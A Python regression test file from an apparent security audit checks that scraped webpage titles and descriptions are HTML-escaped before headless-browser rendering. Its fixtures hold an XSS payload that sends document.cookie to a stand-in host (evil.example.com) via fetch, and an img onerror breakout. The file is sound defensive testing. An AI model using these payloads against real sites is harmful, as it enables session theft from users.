"""Phase 3 whole-repo audit -- core/video/website_to_video.py.

Regression for a real XSS/HTML-injection finding: build_composition_from_content()
interpolated content.title/.headline/.description -- extracted via regex from a
SCRAPED, attacker-controlled webpage's <title>/og:*/<h1> tags -- directly into
generated HTML with no escaping. That HTML is rendered by a real headless
browser (capture_screenshot), so a malicious page's title/og tags could inject
a real <script> that executes in VECTOR's own render context.
"""
from __future__ import annotations

import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from core.video.website_to_video import ExtractedContent, build_composition_from_content


def test_malicious_headline_script_tag_is_escaped_not_executable():
    content = ExtractedContent(
        url="https://evil.example.com",
        title="Evil Site",
        headline='</div><script>fetch("https://evil.example.com/steal?c="+document.cookie)</script>',
        description="normal description",
    )
    with tempfile.TemporaryDirectory() as tmp:
        comp_path = str(Path(tmp) / "comp.html")
        build_composition_from_content(content, None, comp_path, scroll_animation=False)
        html = Path(comp_path).read_text(encoding="utf-8")

    assert "<script>fetch" not in html
    assert "&lt;script&gt;" in html


def test_malicious_description_cannot_break_out_of_div():
    content = ExtractedContent(
        url="https://evil.example.com",
        title="Evil",
        headline="Evil headline",
        description='"><img src=x onerror=alert(1)>',
    )
    with tempfile.TemporaryDirectory() as tmp:
        comp_path = str(Path(tmp) / "comp.html")
        build_composition_from_content(content, None, comp_path)
        html = Path(comp_path).read_text(encoding="utf-8")

    assert "<img src=x onerror=" not in html


def test_normal_content_renders_unescaped_text_correctly():
    """Escaping must not corrupt ordinary, non-malicious content."""
    content = ExtractedContent(
        url="https://example.com",
        title="VECTOR AI System",
        headline="VECTOR Intelligence",
        description="Autonomous multi-agent AI platform",
    )
    with tempfile.TemporaryDirectory() as tmp:
        comp_path = str(Path(tmp) / "comp.html")
        build_composition_from_content(content, None, comp_path)
        html = Path(comp_path).read_text(encoding="utf-8")

    assert "VECTOR Intelligence" in html
    assert "Autonomous multi-agent AI platform" in html


if __name__ == "__main__":
    import pytest
    sys.exit(pytest.main([__file__, "-v"]))
